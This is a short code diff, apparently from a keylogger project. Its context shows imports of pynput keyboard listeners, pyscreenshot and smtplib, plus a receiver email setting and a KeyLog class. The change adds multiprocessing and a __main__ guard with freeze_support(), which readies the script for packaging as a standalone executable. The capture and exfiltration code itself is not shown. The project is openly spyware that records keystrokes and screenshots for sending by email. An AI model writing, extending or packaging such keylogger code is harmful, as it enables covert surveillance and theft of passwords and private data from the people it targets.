@@ -9,6 +9,7 @@ try:
   import psutil
   import pyscreenshot
   import smtplib
+  import multiprocessing
 
   from pynput.keyboard import Key, Listener
   from random import randint
@@ -313,7 +314,8 @@ RECEIVER_EMAIL_ADDR = ""  # set receiver's address''')
       except Exception:
         pass
 
-
-
-keylogClass = KeyLog()
-keylogClass.mainModule()
+if __name__ == '__main__':
+  multiprocessing.freeze_support()
+  keylogClass = KeyLog()
+  keylogClass.mainModule()
+  
